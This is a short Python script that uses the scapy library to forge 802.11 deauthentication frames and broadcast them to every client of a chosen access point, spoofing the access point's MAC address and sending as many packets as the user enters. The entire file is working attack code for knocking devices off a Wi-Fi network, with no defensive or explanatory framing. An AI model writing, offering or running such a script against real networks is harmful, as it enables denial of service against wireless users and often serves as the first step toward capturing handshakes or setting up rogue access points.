from scapy.layers.dot11 import *



iface=input("Enter the name of the interface that is in monitor mode: ")

ap_mac=input("Enter the MAC adress for AP: ")

deauth_packet=RadioTap()/Dot11(type=0,subtype=12,addr1="ff:ff:ff:ff:ff:ff",addr2=ap_mac,addr3=ap_mac)/Dot11Deauth()

package_count=int(input("Enter the package count: "))


sendp(deauth_packet,iface=iface,count=package_count)